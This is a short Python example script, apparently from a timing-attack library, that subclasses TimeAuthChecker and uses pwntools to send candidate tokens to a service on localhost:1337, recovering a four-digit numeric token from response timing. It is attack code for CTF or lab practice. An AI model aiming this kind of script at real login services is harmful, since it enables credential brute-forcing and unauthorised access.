from pwn import remote, context
from timeauth import TimeAuthChecker


class ExampleChecker(TimeAuthChecker):

    def request(self):
        context.log_level = 'error'
        s = remote('localhost', 1337)
        s.recvuntil(':')
        s.sendline(self.get_token())
        s.readall()
        s.close()
        context.log_level = 'info'

    def __init__(self):
        super(self.__class__, self).__init__(
                   charset="0123456789",
                   token_length=4,
                   hidden_char="*"
               )

if __name__ == "__main__":
    a = ExampleChecker()
    a.process()
    a.print_token()
